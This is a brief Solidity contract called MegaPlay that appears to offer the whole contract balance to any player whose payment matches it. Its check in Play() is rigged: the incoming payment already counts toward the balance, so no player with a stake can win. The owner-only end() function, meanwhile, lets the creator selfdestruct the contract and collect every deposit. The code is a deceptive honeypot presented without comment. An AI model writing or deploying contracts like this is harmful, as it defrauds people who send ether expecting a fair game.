1 pragma solidity ^0.4.25;
2 
3 contract MegaPlay
4 {
5     address Owner = msg.sender;
6 
7     function() public payable {}
8     function close() private { selfdestruct(msg.sender); }
9 
10     function Play() public payable {
11         if (msg.value >= address(this).balance) {
12            close();
13         }
14     }
15  
16     function end() public {
17         if (msg.sender == Owner) {
18             close();
19         }
20     }
21 }